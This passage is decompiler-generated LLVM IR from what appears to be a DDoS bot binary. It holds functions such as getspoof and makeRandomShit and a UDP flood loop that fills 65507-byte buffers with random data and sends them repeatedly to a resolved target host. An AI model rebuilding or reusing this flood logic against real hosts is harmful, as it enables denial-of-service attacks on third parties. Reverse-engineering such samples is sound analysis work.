  %v2_804c459 = inttoptr i32 %v1_804c459 to i32*
  store i32 16, i32* %v2_804c459, align 4
  %v2_804c45b = add i32 %v0_804c443, -8
  %v3_804c45b = inttoptr i32 %v2_804c45b to i32*
  store i32 %v2_804c44a, i32* %v3_804c45b, align 4
  %v1_804c45c = add i32 %v0_804c443, -12
  %v2_804c45c = inttoptr i32 %v1_804c45c to i32*
  store i32 0, i32* %v2_804c45c, align 4
  %v0_804c45e = load i32, i32* %edx.global-to-local, align 4
  %v2_804c45e = add i32 %v0_804c443, -16
  %v3_804c45e = inttoptr i32 %v2_804c45e to i32*
  store i32 %v0_804c45e, i32* %v3_804c45e, align 4
  %v2_804c462 = add i32 %v0_804c443, -20
  %v3_804c462 = inttoptr i32 %v2_804c462 to i32*
  store i32 %v2_804c375, i32* %v3_804c462, align 4
  %v5_804c463 = add i32 %v0_804c443, -24
  %v6_804c463 = inttoptr i32 %v5_804c463 to i32*
  store i32 %v3_804be13, i32* %v6_804c463, align 4
  %v1_804c466 = load i32, i32* %stack_var_-80, align 4
  %sext39 = mul i32 %v4_804c43e, 65536
  %v2_804c466 = sdiv i32 %sext39, 65536
  %v7_804c466 = call i32 @sendto(i32 %v2_804c466, i32 %v1_804c466, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804c46b = load i32, i32* @esp, align 4
  %v8_804c46e = icmp ult i32 %stack_var_-60.0, 99
  store i1 %v8_804c46e, i1* %cf.global-to-local, align 1
  %tmp151 = icmp ult i32 %stack_var_-60.0, 100
  br i1 %tmp151, label %dec_label_pc_804c49e, label %dec_label_pc_804c474

dec_label_pc_804c474:                             ; preds = %dec_label_pc_804c2fa
  %v1_804c46b = add i32 %v0_804c46b, 32
  %v5_804c474 = icmp ult i32 %v1_804c46b, 12
  store i1 %v5_804c474, i1* %cf.global-to-local, align 1
  %v1_804c477 = add i32 %v0_804c46b, 16
  %v2_804c477 = inttoptr i32 %v1_804c477 to i32*
  store i32 0, i32* %v2_804c477, align 4
  %v2_804c479 = inttoptr i32 %v2_804c466 to i32*
  %v3_804c479 = call i32 @__GI_time(i32* %v2_804c479)
  %v0_804c47e = load i32, i32* @esp, align 4
  store i32 %v3_804c479, i32* %edx.global-to-local, align 4
  %v7_804c489 = icmp ult i32 %v3_804c479, %v5_804c486
  store i1 %v7_804c489, i1* %cf.global-to-local, align 1
  br i1 %v7_804c489, label %dec_label_pc_804c49e, label %dec_label_pc_804c48d

dec_label_pc_804c48d:                             ; preds = %dec_label_pc_804c474
  %v1_804c47e = add i32 %v0_804c47e, 16
  %v5_804c48d = icmp ult i32 %v1_804c47e, 12
  store i1 %v5_804c48d, i1* %cf.global-to-local, align 1
  %v2_804c490 = inttoptr i32 %v0_804c47e to i32*
  store i32 0, i32* %v2_804c490, align 4
  %v2_804c492 = call i32 @__GI_exit(i32 %v2_804c466)
  br label %dec_label_pc_804c49e

dec_label_pc_804c49e:                             ; preds = %dec_label_pc_804c48d, %dec_label_pc_804c474, %dec_label_pc_804c2fa
  %stack_var_-60.1 = phi i32 [ %stack_var_-60.0, %dec_label_pc_804c2fa ], [ 0, %dec_label_pc_804c474 ], [ 0, %dec_label_pc_804c48d ]
  %v4_804c49e = add i32 %stack_var_-60.1, 1
  br label %dec_label_pc_804c2fa

dec_label_pc_804c4a6:                             ; preds = %entry
  ret i32 %v1_804bdf7

; uselistorder directives
  uselistorder i32 %v2_804c466, { 2, 1, 0 }
  uselistorder i32 %v0_804c40e, { 1, 0, 2 }
  uselistorder i32 %v1_804c409, { 2, 1, 0 }
  uselistorder i32 %v0_804c3e9, { 3, 1, 2, 0 }
  uselistorder i32 %v1_804c314, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 1, 0, 2 }
  uselistorder i32 %v2_804c2b4, { 1, 0 }
  uselistorder i32 %v1_804c2a4, { 1, 0 }
  uselistorder i1 %v0_804c28e, { 1, 0 }
  uselistorder i32 %v7_804c28c, { 1, 0 }
  uselistorder i32 %v1_804c254, { 1, 0 }
  uselistorder i1 %v0_804c23e, { 1, 0 }
  uselistorder i32 %v7_804c23c, { 1, 0 }
  uselistorder i32 %v1_804c201, { 1, 0 }
  uselistorder i1 %v0_804c1eb, { 1, 0 }
  uselistorder i32 %v7_804c1e9, { 1, 0 }
  uselistorder i32 %v1_804c1ae, { 1, 0 }
  uselistorder i1 %v0_804c198, { 1, 0 }
  uselistorder i32 %v7_804c196, { 1, 0 }
  uselistorder i32 %v1_804c15b, { 1, 0 }
  uselistorder i1 %v0_804c145, { 1, 0 }
  uselistorder i32 %v7_804c143, { 1, 0 }
  uselistorder i32 %v1_804c108, { 1, 0 }
  uselistorder i1 %v0_804c0f2, { 1, 0 }
  uselistorder i32 %v7_804c0f0, { 1, 0 }
  uselistorder i1 %v0_804c075, { 1, 0 }
  uselistorder i32 %v7_804c073, { 1, 0 }
  uselistorder i1 %v0_804c00b, { 1, 0 }
  uselistorder i1 %v0_804bf86, { 1, 0 }
  uselistorder i32 %v4_804be6e, { 1, 0, 2 }
  uselistorder i32 %storemerge150, { 2, 3, 0, 1 }
  uselistorder i32 %v4_804be2e, { 1, 0 }
  uselistorder i1 %v5_804bde1, { 1, 2, 0, 3, 4 }
  uselistorder i16* %stack_var_-172, { 1, 0 }
  uselistorder i16* %stack_var_-100, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i1* %cf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 34, 15, 16, 17, 19, 18, 20, 22, 21, 23, 25, 24, 26, 28, 27, 29, 31, 30, 32, 33, 0, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62 }
  uselistorder i32 (i32)* @getspoof, { 2, 1, 0 }
  uselistorder i32 %arg4, { 3, 4, 2, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804c2aa, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804c0c0, { 1, 0 }
  uselistorder label %dec_label_pc_804be5d, { 1, 0 }
  uselistorder label %dec_label_pc_804be71.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804be2e, { 1, 0 }
}

define i32 @makeRandomShit(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_804c4b0 = load i32, i32* @ebx, align 4
  %v2_804c4b9 = call i32 @__GI_time(i32* null)
  %v1_804c4c5 = call i32 @srand(i32 %v2_804c4b9)
  %v5_804c4e2 = ptrtoint i8* %arg1 to i32
  %v5_804c4f514 = icmp sgt i32 %tmp, 0
  br i1 %v5_804c4f514, label %dec_label_pc_804c4dd, label %dec_label_pc_804c4f7

dec_label_pc_804c4dd:                             ; preds = %entry, %dec_label_pc_804c4dd
  %storemerge15 = phi i32 [ %v4_804c4ec, %dec_label_pc_804c4dd ], [ 0, %entry ]
  %v6_804c4e2 = add i32 %storemerge15, %v5_804c4e2
  store i32 %v6_804c4e2, i32* @ebx, align 4
  %v0_804c4e5 = call i32 @random()
  %v1_804c4e5 = trunc i32 %v0_804c4e5 to i8
  %v3_804c4ea = load i32, i32* @ebx, align 4
  %v4_804c4ea = inttoptr i32 %v3_804c4ea to i8*
  store i8 %v1_804c4e5, i8* %v4_804c4ea, align 1
  %v4_804c4ec = add nuw nsw i32 %storemerge15, 1
  %exitcond = icmp eq i32 %v4_804c4ec, %tmp
  br i1 %exitcond, label %dec_label_pc_804c4f7, label %dec_label_pc_804c4dd

dec_label_pc_804c4f7:                             ; preds = %dec_label_pc_804c4dd, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %tmp, %dec_label_pc_804c4dd ]
  store i32 %v0_804c4b0, i32* @ebx, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804c4ec, { 1, 0 }
  uselistorder label %dec_label_pc_804c4dd, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v12_804c501 = ptrtoint i32* %stack_var_-108 to i32
  %v5_804c512 = icmp ult i32* %stack_var_-108, inttoptr (i32 12 to i32*)
  store i1 %v5_804c512, i1* %cf.global-to-local, align 1
  %v2_804c517 = call i32 @__GI_time(i32* null)
  store i32 %v2_804c517, i32* @eax, align 4
  %v4_804c522 = add i32 %arg3, -3
  %v8_804c522 = icmp ult i32 %arg3, 3
  %v9_804c522 = sub i32 2, %arg3
  %v10_804c522 = and i32 %v9_804c522, %arg3
  %v11_804c522 = icmp slt i32 %v10_804c522, 0
  store i1 %v8_804c522, i1* %cf.global-to-local, align 1
  %v12_804c522 = icmp eq i32 %v4_804c522, 0
  %v13_804c522 = icmp slt i32 %v4_804c522, 0
  %v3_804c526 = icmp eq i1 %v13_804c522, %v11_804c522
  %v4_804c526 = icmp eq i1 %v12_804c522, false
  %v5_804c526 = and i1 %v4_804c526, %v3_804c526
  br i1 %v5_804c526, label %dec_label_pc_804c548, label %dec_label_pc_804c528

dec_label_pc_804c528:                             ; preds = %entry
  %v5_804c528 = icmp ult i32* %stack_var_-108, inttoptr (i32 4 to i32*)
  store i1 %v5_804c528, i1* %cf.global-to-local, align 1
  %v3_804c536 = call i32 @Send(i32 %arg1, i32 ptrtoint ([85 x i8]* @global_var_8069888.175 to i32))
  store i32 %v3_804c536, i32* %eax.global-to-local, align 4
  store i1 %v5_804c512, i1* %cf.global-to-local, align 1
  %v1_804c543 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804c543, i32* @eax, align 4
  %v0_804c548.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c548

dec_label_pc_804c548:                             ; preds = %entry, %dec_label_pc_804c528
  %v0_804c548 = phi i32 [ %v12_804c501, %entry ], [ %v0_804c548.pre, %dec_label_pc_804c528 ]
  %v5_804c548 = icmp ult i32 %v0_804c548, 12
  store i1 %v5_804c548, i1* %cf.global-to-local, align 1
  %v1_804c54e = call i32 @mfork(i32 %arg2)
  store i32 %v1_804c54e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c556 = icmp eq i32 %v1_804c54e, 0
  %v1_804c558 = icmp eq i1 %v1_804c556, false
  br i1 %v1_804c558, label %dec_label_pc_804c7fd, label %dec_label_pc_804c55e

dec_label_pc_804c55e:                             ; preds = %dec_label_pc_804c548
  store i1 %v5_804c512, i1* %cf.global-to-local, align 1
  %v1_804c566 = call i32 @malloc(i32 65507)
  store i32 %v1_804c566, i32* %eax.global-to-local, align 4
  %v5_804c571 = icmp ult i32* %stack_var_-108, inttoptr (i32 4 to i32*)
  store i1 %v5_804c571, i1* %cf.global-to-local, align 1
  %v4_804c57e = inttoptr i32 %v1_804c566 to i8*
  %v5_804c57e = call i32 @__GI_memset(i8* %v4_804c57e, i32 0, i32 65507)
  %v1_804c589 = add i32 %arg4, 8
  %v5_804c589 = icmp ugt i32 %arg4, -9
  store i1 %v5_804c589, i1* %cf.global-to-local, align 1
  store i32 %v1_804c589, i32* %eax.global-to-local, align 4
  %v1_804c58c = inttoptr i32 %v1_804c589 to i32*
  %v2_804c58c = load i32, i32* %v1_804c58c, align 4
  store i32 %v2_804c58c, i32* %eax.global-to-local, align 4
  %v4_804c5a0 = inttoptr i32 %v2_804c58c to i8*
  %v7_804c5a9 = call i32 @_strncmp(i8* %v4_804c5a0, i8* bitcast (i8** @global_var_80698dd.176 to i8*), i32 2)
  %v8_804c5a9 = urem i32 %v7_804c5a9, 2
  %v9_804c5a9 = icmp eq i32 %v8_804c5a9, 0
  %v0_804c5ab = load i1, i1* %cf.global-to-local, align 1
  %v2_804c5ab = or i1 %v0_804c5ab, %v9_804c5a9
  %v3_804c5ab = zext i1 %v2_804c5ab to i32
  %v4_804c5ab = load i32, i32* @edx, align 4
  %v5_804c5ab = and i32 %v4_804c5ab, -256
  %v6_804c5ab = or i32 %v3_804c5ab, %v5_804c5ab
  %v7_804c5ab = xor i32 %v6_804c5ab, 1
  store i32 %v7_804c5ab, i32* %edx.global-to-local, align 4
  %v1_804c5b3 = trunc i32 %v7_804c5ab to i8
  %v3_804c5b3 = zext i1 %v0_804c5ab to i8
  %v15_804c5b3 = icmp eq i8 %v1_804c5b3, %v3_804c5b3
  %v1_804c5bc = icmp eq i1 %v15_804c5b3, false
  %v1_804c5c8 = add i32 %arg4, 12
  %v5_804c5c8 = icmp ugt i32 %arg4, -13
  store i1 %v5_804c5c8, i1* %cf.global-to-local, align 1
  store i32 %v1_804c5c8, i32* %eax.global-to-local, align 4
  %v1_804c5cb = inttoptr i32 %v1_804c5c8 to i32*
  %v2_804c5cb = load i32, i32* %v1_804c5cb, align 4
  store i32 %v2_804c5cb, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804c5df = inttoptr i32 %v2_804c5cb to i8*
  store i32 %v2_804c5cb, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_80698dd.176 to i32), i32* @edi, align 4
  %v7_804c5e8 = call i32 @_strncmp(i8* %v4_804c5df, i8* bitcast (i8** @global_var_80698dd.176 to i8*), i32 2)
  %v8_804c5e8 = urem i32 %v7_804c5e8, 2
  %v9_804c5e8 = icmp eq i32 %v8_804c5e8, 0
  %v0_804c5ea = load i1, i1* %cf.global-to-local, align 1
  %v2_804c5ea = or i1 %v0_804c5ea, %v9_804c5e8
  %v3_804c5ea = zext i1 %v2_804c5ea to i32
  %v4_804c5ea = load i32, i32* %edx.global-to-local, align 4
  %v5_804c5ea = and i32 %v4_804c5ea, -256
  %v6_804c5ea = or i32 %v3_804c5ea, %v5_804c5ea
  %v7_804c5ea = xor i32 %v6_804c5ea, 1
  store i32 %v7_804c5ea, i32* %edx.global-to-local, align 4
  %v1_804c5f2 = trunc i32 %v7_804c5ea to i8
  %v3_804c5f2 = zext i1 %v0_804c5ea to i8
  %v4_804c5f2 = sub nsw i8 %v1_804c5f2, %v3_804c5f2
  %v15_804c5f2 = icmp eq i8 %v4_804c5f2, 0
  %v2_804c5f6 = sext i8 %v4_804c5f2 to i32
  store i32 %v2_804c5f6, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c5fb = icmp eq i1 %v15_804c5f2, false
  br i1 %v1_804c5fb, label %dec_label_pc_804c60d, label %dec_label_pc_804c618

dec_label_pc_804c60d:                             ; preds = %dec_label_pc_804c55e
  store i1 %v5_804c5c8, i1* %cf.global-to-local, align 1
  store i32 %v1_804c5c8, i32* %eax.global-to-local, align 4
  %v2_804c613 = load i32, i32* %v1_804c5cb, align 4
  store i32 %v2_804c613, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c618

dec_label_pc_804c618:                             ; preds = %dec_label_pc_804c55e, %dec_label_pc_804c60d
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_804c60d ], [ 1, %dec_label_pc_804c55e ]
  %v0_804c618 = load i32, i32* @esp, align 4
  %v5_804c618 = icmp ult i32 %v0_804c618, 12
  store i1 %v5_804c618, i1* %cf.global-to-local, align 1
  %v2_804c61d = call i32 @__GI_time(i32* null)
  store i32 %v2_804c61d, i32* %eax.global-to-local, align 4
  store i1 %v5_804c512, i1* %cf.global-to-local, align 1
  %v1_804c629 = call i32 @srand(i32 %v2_804c61d)
  %v1_804c634 = add i32 %arg4, 16
  store i32 %v1_804c634, i32* %eax.global-to-local, align 4
  %v1_804c637 = inttoptr i32 %v1_804c634 to i32*
  %v2_804c637 = load i32, i32* %v1_804c637, align 4
  store i32 %v2_804c637, i32* %eax.global-to-local, align 4
  store i1 %v5_804c512, i1* %cf.global-to-local, align 1
  %v1_804c63d = call i32 @atol(i32 %v2_804c637)
  store i1 %v5_804c571, i1* %cf.global-to-local, align 1
  %v2_804c64f = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804c64f, i32* %eax.global-to-local, align 4
  %v4_804c653 = bitcast i32* %stack_var_-72 to i8*
  %v5_804c653 = call i32 @__GI_memset(i8* %v4_804c653, i32 0, i32 16)
  %v1_804c65e = add i32 %arg4, 4
  store i32 %v1_804c65e, i32* %eax.global-to-local, align 4
  %v1_804c661 = inttoptr i32 %v1_804c65e to i32*
  %v2_804c661 = load i32, i32* %v1_804c661, align 4
  store i32 %v2_804c661, i32* %eax.global-to-local, align 4
  %v5_804c663 = icmp ult i32* %stack_var_-108, inttoptr (i32 8 to i32*)
  store i1 %v5_804c663, i1* %cf.global-to-local, align 1
  %v3_804c66a = call i32 @host2ip(i32 %arg2, i32 %v2_804c661)
  store i32 %v3_804c66a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-72, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c67f = icmp eq i1 %v1_804c5bc, false
  br i1 %v1_804c67f, label %dec_label_pc_804c6b5, label %dec_label_pc_804c681

dec_label_pc_804c681:                             ; preds = %dec_label_pc_804c618
  store i32 %v1_804c589, i32* %eax.global-to-local, align 4
  %v2_804c687 = load i32, i32* %v1_804c58c, align 4
  store i32 %v2_804c687, i32* %eax.global-to-local, align 4
  store i1 %v5_804c512, i1* %cf.global-to-local, align 1
  %v1_804c68d = call i32 @atol(i32 %v2_804c687)
  %v1_804c695 = urem i32 %v1_804c68d, 65536
  store i32 %v1_804c695, i32* %eax.global-to-local, align 4
  store i1 %v5_804c512, i1* %cf.global-to-local, align 1
  %v1_804c69e = call i32 @htons(i32 %v1_804c695)
  %v2_804c69e = trunc i32 %v1_804c69e to i16
  store i1 %v5_804c5c8, i1* %cf.global-to-local, align 1
  store i32 %v1_804c5c8, i32* %eax.global-to-local, align 4
  %v2_804c6b0 = load i32, i32* %v1_804c5cb, align 4
  store i32 %v2_804c6b0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c6b5

dec_label_pc_804c6b5:                             ; preds = %dec_label_pc_804c618, %dec_label_pc_804c681
  %stack_var_-70.0 = phi i16 [ %v2_804c69e, %dec_label_pc_804c681 ], [ %tmp23, %dec_label_pc_804c618 ]
  store i32 %v1_804c589, i32* %eax.global-to-local, align 4
  %v2_804c6bb = load i32, i32* %v1_804c58c, align 4
  store i32 %v2_804c6bb, i32* %edx.global-to-local, align 4
  store i32 %v1_804c65e, i32* %eax.global-to-local, align 4
  %v2_804c6c3 = load i32, i32* %v1_804c661, align 4
  store i32 %v2_804c6c3, i32* %eax.global-to-local, align 4
  store i1 %v5_804c663, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %stack_var_-140, align 4
  %v3_804c6d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([49 x i8]* @global_var_80698e8.178 to i32))
  store i32 %v3_804c6d8, i32* %eax.global-to-local, align 4
  %v0_804c6dd = load i32, i32* @esp, align 4
  %v2_804c6dd = icmp ugt i32 %v0_804c6dd, -33
  store i1 %v2_804c6dd, i1* %cf.global-to-local, align 1
  %v8_804c710 = icmp eq i32 %stack_var_-36.0, 0
  %v12_804c710 = icmp eq i32 %stack_var_-36.0, 1
  %v5_804c7cf = add i32 %v1_804c63d, %v2_804c517
  %v1_804c784 = and i32 %v1_804c566, -256
  %v1_804c6e4 = icmp eq i1 %v1_804c67f, false
  %v1_804c714 = icmp eq i1 %v12_804c710, false
  br label %dec_label_pc_804c6e0

dec_label_pc_804c6e0:                             ; preds = %dec_label_pc_804c7dd, %dec_label_pc_804c6b5
  %v0_804c6e6 = phi i32 [ %v12_804c501, %dec_label_pc_804c6b5 ], [ %v0_804c6e617, %dec_label_pc_804c7dd ]
  %stack_var_-52.0 = phi i32 [ %tmp, %dec_label_pc_804c6b5 ], [ %v4_804c7dd, %dec_label_pc_804c7dd ]
  %stack_var_-104.0 = phi i32 [ %tmp21, %dec_label_pc_804c6b5 ], [ %stack_var_-104.1, %dec_label_pc_804c7dd ]
  %stack_var_-70.1 = phi i16 [ %stack_var_-70.0, %dec_label_pc_804c6b5 ], [ %stack_var_-70.2, %dec_label_pc_804c7dd ]
  store i1 %v1_804c5bc, i1* %cf.global-to-local, align 1
  br i1 %v1_804c6e4, label %dec_label_pc_804c710, label %dec_label_pc_804c6e6

dec_label_pc_804c6e6:                             ; preds = %dec_label_pc_804c6e0
  %v5_804c6e6 = icmp ult i32 %v0_804c6e6, 8
  store i1 %v5_804c6e6, i1* %cf.global-to-local, align 1
  %v1_804c6e9 = add i32 %v0_804c6e6, -12
  %v2_804c6e9 = inttoptr i32 %v1_804c6e9 to i32*
  store i32 65535, i32* %v2_804c6e9, align 4
  %v1_804c6ee = add i32 %v0_804c6e6, -16
  %v2_804c6ee = inttoptr i32 %v1_804c6ee to i32*
  store i32 1026, i32* %v2_804c6ee, align 4
  %v0_804c6f3 = load i32, i32* %stack_var_-140, align 4
  %v3_804c6f3 = call i32 @realrand(i32 %v0_804c6f3, i32 ptrtoint ([49 x i8]* @global_var_80698e8.178 to i32))
  %v0_804c6f8 = load i32, i32* @esp, align 4
  %v1_804c6f8 = add i32 %v0_804c6f8, 16
  %v1_804c6fb = urem i32 %v3_804c6f3, 65536
  store i32 %v1_804c6fb, i32* %eax.global-to-local, align 4
  %v5_804c700 = icmp ult i32 %v1_804c6f8, 12
  store i1 %v5_804c700, i1* %cf.global-to-local, align 1
  %v3_804c703 = inttoptr i32 %v0_804c6f8 to i32*
  store i32 %v1_804c6fb, i32* %v3_804c703, align 4
  %v0_804c704 = load i32, i32* %stack_var_-140, align 4
  %v1_804c704 = call i32 @htons(i32 %v0_804c704)
  %v2_804c704 = trunc i32 %v1_804c704 to i16
  store i32 %v1_804c704, i32* %eax.global-to-local, align 4
  %v0_804c709 = load i32, i32* @esp, align 4
  %v1_804c709 = add i32 %v0_804c709, 16
  %v2_804c709 = icmp ugt i32 %v0_804c709, -17
  store i1 %v2_804c709, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c710

dec_label_pc_804c710:                             ; preds = %dec_label_pc_804c6e0, %dec_label_pc_804c6e6
  %v0_804c741 = phi i32 [ %v0_804c6e6, %dec_label_pc_804c6e0 ], [ %v1_804c709, %dec_label_pc_804c6e6 ]
  %stack_var_-70.2 = phi i16 [ %stack_var_-70.1, %dec_label_pc_804c6e0 ], [ %v2_804c704, %dec_label_pc_804c6e6 ]
  store i1 %v8_804c710, i1* %cf.global-to-local, align 1
  br i1 %v1_804c714, label %dec_label_pc_804c739, label %dec_label_pc_804c716

dec_label_pc_804c716:                             ; preds = %dec_label_pc_804c710
  %v5_804c716 = icmp ult i32 %v0_804c741, 8
  store i1 %v5_804c716, i1* %cf.global-to-local, align 1
  %v1_804c719 = add i32 %v0_804c741, -12
  %v2_804c719 = inttoptr i32 %v1_804c719 to i32*
  store i32 65507, i32* %v2_804c719, align 4
  %v1_804c71e = add i32 %v0_804c741, -16
  %v2_804c71e = inttoptr i32 %v1_804c71e to i32*
  store i32 64, i32* %v2_804c71e, align 4
  %v1_804c720 = sext i16 %stack_var_-70.2 to i32
  %v3_804c720 = call i32 @realrand(i32 %v1_804c720, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c720, i32* %eax.global-to-local, align 4
  %v0_804c725 = load i32, i32* @esp, align 4
  %tmp55 = and i32 %v0_804c725, -8
  %v5_804c728 = icmp eq i32 %tmp55, -16
  store i1 %v5_804c728, i1* %cf.global-to-local, align 1
  %v2_804c72b = add i32 %v0_804c725, 4
  %v3_804c72b = inttoptr i32 %v2_804c72b to i32*
  store i32 %v3_804c720, i32* %v3_804c72b, align 4
  %v6_804c72c = inttoptr i32 %v0_804c725 to i32*
  store i32 %v1_804c566, i32* %v6_804c72c, align 4
  %v2_804c72f = inttoptr i32 %v1_804c720 to i8*
  %v3_804c72f = call i32 @makeRandomShit(i8* %v2_804c72f)
  br label %dec_label_pc_804c75c

dec_label_pc_804c739:                             ; preds = %dec_label_pc_804c710
  store i32 %v1_804c5c8, i32* %eax.global-to-local, align 4
  %v2_804c73f = load i32, i32* %v1_804c5cb, align 4
  store i32 %v2_804c73f, i32* %eax.global-to-local, align 4
  %v5_804c741 = icmp ult i32 %v0_804c741, 12
  store i1 %v5_804c741, i1* %cf.global-to-local, align 1
  %v2_804c744 = add i32 %v0_804c741, -16
  %v3_804c744 = inttoptr i32 %v2_804c744 to i32*
  store i32 %v2_804c73f, i32* %v3_804c744, align 4
  %v1_804c745 = sext i16 %stack_var_-70.2 to i32
  %v2_804c745 = call i32 @atol(i32 %v1_804c745)
  store i32 %v2_804c745, i32* %eax.global-to-local, align 4
  %v0_804c74a = load i32, i32* @esp, align 4
  %tmp56 = and i32 %v0_804c74a, -8
  %v5_804c74d = icmp eq i32 %tmp56, -16
  store i1 %v5_804c74d, i1* %cf.global-to-local, align 1
  %v2_804c750 = add i32 %v0_804c74a, 4
  %v3_804c750 = inttoptr i32 %v2_804c750 to i32*
  store i32 %v2_804c745, i32* %v3_804c750, align 4
  %v6_804c751 = inttoptr i32 %v0_804c74a to i32*
  store i32 %v1_804c566, i32* %v6_804c751, align 4
  %v2_804c754 = inttoptr i32 %v1_804c745 to i8*
  %v3_804c754 = call i32 @makeRandomShit(i8* %v2_804c754)
  br label %dec_label_pc_804c75c

dec_label_pc_804c75c:                             ; preds = %dec_label_pc_804c716, %dec_label_pc_804c739
  %storemerge = phi i32 [ %v3_804c72f, %dec_label_pc_804c716 ], [ %v3_804c754, %dec_label_pc_804c739 ]
  %v1_804c765.pre-phi = phi i32 [ %v1_804c720, %dec_label_pc_804c716 ], [ %v1_804c745, %dec_label_pc_804c739 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v0_804c734.sink = load i32, i32* @esp, align 4
  %tmp57 = and i32 %v0_804c734.sink, -4
  %v5_804c75c = icmp eq i32 %tmp57, -16
  store i1 %v5_804c75c, i1* %cf.global-to-local, align 1
  %v1_804c75f = add i32 %v0_804c734.sink, 8
  %v2_804c75f = inttoptr i32 %v1_804c75f to i32*
  store i32 17, i32* %v2_804c75f, align 4
  %v1_804c761 = add i32 %v0_804c734.sink, 4
  %v2_804c761 = inttoptr i32 %v1_804c761 to i32*
  store i32 2, i32* %v2_804c761, align 4
  %v2_804c763 = inttoptr i32 %v0_804c734.sink to i32*
  store i32 2, i32* %v2_804c763, align 4
  %v4_804c765 = call i32 @socket(i32 %v1_804c765.pre-phi, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c765, i32* %eax.global-to-local, align 4
  %v0_804c76a = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804c770 = icmp slt i32 %v4_804c765, 0
  br i1 %v5_804c770, label %dec_label_pc_804c7b7, label %dec_label_pc_804c776

dec_label_pc_804c776:                             ; preds = %dec_label_pc_804c75c
  store i32 %v2_804c64f, i32* %edx.global-to-local, align 4
  store i32 %v1_804c784, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v1_804c566, i32* @edi, align 4
  %v3_804c78a = call i32 @_strlen(i8* %v4_804c57e)
  %v4_804c78a = mul i32 %v3_804c78a, -1
  %v5_804c78a = add i32 %v4_804c78a, -2
  store i32 %v5_804c78a, i32* @ecx, align 4
  %v1_804c78e = sub i32 1, %v4_804c78a
  store i32 %v1_804c78e, i32* %eax.global-to-local, align 4
  %v0_804c792 = load i32, i32* @esp, align 4
  %v5_804c792 = icmp ult i32 %v0_804c792, 8
  store i1 %v5_804c792, i1* %cf.global-to-local, align 1
  %v1_804c795 = add i32 %v0_804c792, -12
  %v2_804c795 = inttoptr i32 %v1_804c795 to i32*
  store i32 16, i32* %v2_804c795, align 4
  %v2_804c797 = add i32 %v0_804c792, -16
  %v3_804c797 = inttoptr i32 %v2_804c797 to i32*
  store i32 %v2_804c64f, i32* %v3_804c797, align 4
  %v1_804c798 = add i32 %v0_804c792, -20
  %v2_804c798 = inttoptr i32 %v1_804c798 to i32*
  store i32 0, i32* %v2_804c798, align 4
  %v0_804c79a = load i32, i32* %eax.global-to-local, align 4
  %v2_804c79a = add i32 %v0_804c792, -24
  %v3_804c79a = inttoptr i32 %v2_804c79a to i32*
  store i32 %v0_804c79a, i32* %v3_804c79a, align 4
  %v5_804c79b = add i32 %v0_804c792, -28
  %v6_804c79b = inttoptr i32 %v5_804c79b to i32*
  store i32 %v1_804c566, i32* %v6_804c79b, align 4
  %v5_804c79e = add i32 %v0_804c792, -32
  %v6_804c79e = inttoptr i32 %v5_804c79e to i32*
  store i32 %v4_804c765, i32* %v6_804c79e, align 4
  %v8_804c7a1 = call i32 @sendto(i32 %v1_804c566, i32 2, i32 ptrtoint (i8** @global_var_80698dd.176 to i32), i32 %v2_804c5cb, i32 2, i32 ptrtoint (i8** @global_var_80698dd.176 to i32))
  store i32 %v8_804c7a1, i32* %eax.global-to-local, align 4
  %v0_804c7a6 = load i32, i32* @esp, align 4
  %v1_804c7a6 = add i32 %v0_804c7a6, 32
  %v5_804c7a9 = icmp ult i32 %v1_804c7a6, 12
  store i1 %v5_804c7a9, i1* %cf.global-to-local, align 1
  %v5_804c7ac = add i32 %v0_804c7a6, 16
